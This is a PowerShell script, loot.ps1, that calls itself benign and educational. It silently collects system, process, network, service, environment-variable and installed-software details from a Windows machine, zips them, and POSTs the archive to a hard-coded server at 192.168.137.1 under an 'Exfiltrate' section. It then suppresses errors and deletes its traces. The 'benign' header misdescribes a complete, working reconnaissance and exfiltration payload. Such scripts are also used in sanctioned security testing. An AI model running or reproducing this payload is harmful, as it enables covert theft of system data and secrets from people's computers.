# loot.ps1 - Benign system information collection for Windows
# Safe for educational/demo purposes - collects only basic system configuration

$SERVER_IP = "192.168.137.1"
$PORT = 80
$LOOT_DIR = Join-Path $env:TEMP ("loot-" + [Guid]::NewGuid().ToString())

New-Item -ItemType Directory -Force -Path $LOOT_DIR | Out-Null

# --- System Information Collection ---
New-Item -ItemType Directory -Force -Path "$LOOT_DIR\system_info" | Out-Null

# Helper function to write text files in pure ASCII/UTF-8 (no UTF-16)
function Write-LootFile {
    param(
        [string]$Path,
        [string]$Content
    )
    try {
        # Create UTF8 encoding without BOM
        $utf8NoBom = New-Object System.Text.UTF8Encoding $false
        $bytes = $utf8NoBom.GetBytes($Content)
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    } catch {
        # Fallback: use Out-File with ASCII encoding
        $Content | Out-File -FilePath $Path -Encoding ASCII -Force
    }
}

# Operating System Information
try {
    $content = (Get-CimInstance Win32_OperatingSystem | Format-List * | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\os_info.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\os_info.txt" -Content "Error: $_"
}

try {
    $content = (Get-ComputerInfo | Format-List | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\computer_info.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\computer_info.txt" -Content "Error: $_"
}

try {
    $content = (systeminfo | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\systeminfo.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\systeminfo.txt" -Content "Error: $_"
}

# Process Information
try {
    $content = (Get-Process | Select-Object Name, Id, CPU, WorkingSet, Path | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\process_list.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\process_list.txt" -Content "Error: $_"
}

# Network Configuration
try {
    $content = (ipconfig /all | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\ipconfig.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\ipconfig.txt" -Content "Error: $_"
}

try {
    $content = (Get-NetAdapter | Format-List | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\network_adapters.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\network_adapters.txt" -Content "Error: $_"
}

try {
    $content = (Get-NetIPAddress | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\ip_addresses.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\ip_addresses.txt" -Content "Error: $_"
}

try {
    $content = (Get-NetRoute | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\routes.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\routes.txt" -Content "Error: $_"
}

try {
    $content = (netstat -ano | Out-String)
    Write-LootFile -Path "$LOOT_DIR\system_info\netstat.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\netstat.txt" -Content "Error: $_"
}

# Services
try {
    $content = (Get-Service | Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\services.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\services.txt" -Content "Error: $_"
}

# Environment Variables
try {
    $content = (Get-ChildItem Env: | Format-Table Name, Value -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\environment.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\environment.txt" -Content "Error: $_"
}

# Installed Software
try {
    $content = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher |
        Format-Table -AutoSize | Out-String -Width 200)
    Write-LootFile -Path "$LOOT_DIR\system_info\installed_software.txt" -Content $content
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\installed_software.txt" -Content "Error: $_"
}

# Add a manifest file with metadata
try {
    $manifest = @"
Collection Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Computer Name: $env:COMPUTERNAME
User: $env:USERNAME
Domain: $env:USERDOMAIN
OS: $(try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Unknown" })
"@
    Write-LootFile -Path "$LOOT_DIR\system_info\manifest.txt" -Content $manifest
} catch {
    Write-LootFile -Path "$LOOT_DIR\system_info\manifest.txt" -Content "Error creating manifest"
}

# ---------------------------------------------------------------------------
# Compress with forward slashes (Android/Linux compatible)
# ---------------------------------------------------------------------------
$ZipPath = Join-Path $env:TEMP "loot.zip"

# Remove old zip if it exists
if (Test-Path $ZipPath) {
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
}

try {
    # Verify files were created
    $files = Get-ChildItem -Path "$LOOT_DIR\system_info" -File
    if ($files.Count -eq 0) {
        Write-LootFile -Path "$LOOT_DIR\system_info\error.txt" -Content "No data collected - all commands failed"
    }

    # Use .NET ZipFile to control path separators (forward slash for Android compatibility)
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Create zip with forward slashes
    $zip = [System.IO.Compression.ZipFile]::Open($ZipPath, 'Create')
    try {
        Get-ChildItem -Path "$LOOT_DIR\system_info" -File | ForEach-Object {
            $relativePath = "system_info/" + $_.Name
            $entry = $zip.CreateEntry($relativePath)
            $entryStream = $entry.Open()
            try {
                $fileStream = [System.IO.File]::OpenRead($_.FullName)
                try {
                    $fileStream.CopyTo($entryStream)
                } finally {
                    $fileStream.Close()
                }
            } finally {
                $entryStream.Close()
            }
        }
    } finally {
        $zip.Dispose()
    }
} catch {
    # Fallback to Compress-Archive if .NET method fails
    try {
        Compress-Archive -Path "$LOOT_DIR\*" -DestinationPath $ZipPath -Force
    } catch {
        # Last resort: create a minimal zip with error message
        Write-LootFile -Path "$env:TEMP\error.txt" -Content "Compression failed: $_"
        Compress-Archive -Path "$env:TEMP\error.txt" -DestinationPath $ZipPath -Force
    }
}

# ---------------------------------------------------------------------------
# Exfiltrate
# ---------------------------------------------------------------------------
try {
    if (Test-Path $ZipPath) {
        $fileSize = (Get-Item $ZipPath).Length
        if ($fileSize -gt 0) {
            $Uri = "http://$SERVER_IP`:$PORT/"
            Invoke-WebRequest -Uri $Uri -Method Post -InFile $ZipPath -UseBasicParsing
        }
    }
} catch {
    # Fail silently
}

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------
Remove-Item -Recurse -Force $LOOT_DIR -ErrorAction SilentlyContinue
Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
